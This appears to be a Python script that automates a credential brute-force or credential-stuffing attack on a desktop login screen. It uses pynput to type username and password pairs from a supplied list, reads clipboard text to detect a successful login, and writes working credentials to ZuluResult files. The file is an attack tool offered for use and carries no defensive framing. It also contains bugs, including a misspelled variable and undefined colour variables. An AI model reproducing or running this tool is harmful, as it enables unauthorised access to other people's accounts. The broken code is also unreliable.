# -*-encoding:utf8 -*-

from    pynput.keyboard import  Controller as kybrd, Key    as k, Listener
from    pynput.mouse    import  Controller as mouse, Button as b
from    threading       import  Thread
from    clipboard       import  paste   as clipaste
from    psutil          import  Process as self
from    time    import  sleep
from    re      import  findall
from    os      import  path, listdir, getcwd

kb  = kybrd()   # keyboard
ms  = mouse()   # mouse

def tab():
    print('<tab>')
    kb.tap(k.tab)
    sleep(.3)
    kb.release(k.tab)
    sleep(.3)

def click(x=50, y=50):
    print('<click>')
    ms.position = (x, y)
    sleep(.2)
    ms.click(b.left)

def select():
    print('<select>')
    kb.press(k.ctrl)
    kb.tap('a')
    kb.release('a')
    kb.release(k.ctrl)
    sleep(.2)

def send_keys(username, password):
    print('<send_keys>')
    click()
    # type useranme
    tab()
    kb.type(username)
    # type password
    tab()
    kb.type(password)
    # send keys
    kb.tap(k.enter)
    kb.release(k.enter)

def copy():
    print('<copy>')
    kb.press(k.ctrl)
    kb.tap('c')
    kb.release('c')
    kb.release(k.ctrl)
    sleep(.2)

def done(msg='Activity'):
    print('<is_done>')
    for _ in range(7):
        # select
        click()
        select()
        copy()
        sleep(.3)
        result = clipaste()
        if  msg in result:
            return True
        elif 'Cancel' in result:
            sleep(1)
        elif resutl == 'paste()':
            exit('PasteError: Nothing found in clipaste!!')
        else:
            return False
    # ckick Cancel
    click(680, 355)

def save(data,n='0'):
    print('<save>')
    with open('ZuluResult_{}.txt'.format(n + 1), 'a') as file:
        file.write(data)

def logout(x1=15, y1=30, x2=40,y2=275):
    print('<logout>')
    # click options
    sleep(.2)
    ms.position = x1, y1
    ms.click(b.left)
    sleep(.2)
    # click logout
    ms.position = x2, y2
    ms.click(b.left)
    sleep(.2)
    while not done('Desktop'):
        sleep(.2)

def main():
    print('<main>')
    keys_list = open(input('keys_list: '))
    # kill "this" if  on_press "esc" key
    Listener(on_press=lambda key:self().kill() if  key == k.esc else '1').start()
    # num of zuluResults file exists
    n = len(findall(r'ZuluResult_\d+.txt', str(listdir(getcwd()))))# brute force folder
    for data in keys_list:
        username, password = data.strip().split(';')
        send_keys(username, password)
        # check if done else fail
        sleep(1.5)
        if  done():
            print('\n{}[ + ] Login Success : (username:"{}" & password:"{}"){}'.format(clr1, username, password, clr3))
            save(data, n)
            print(' :: Saved ::')
            logout()
            print(' :: Logout :: ')
        else:
            print('\n{}[ - ] Login Failed : ({} & {}){}'.format(clr2, username, password, clr3))
        sleep(.9)
    keys_list.close()

if  __name__ == '__main__':
    main()

# fail
# There is an error with the credentials

# done
# Activity
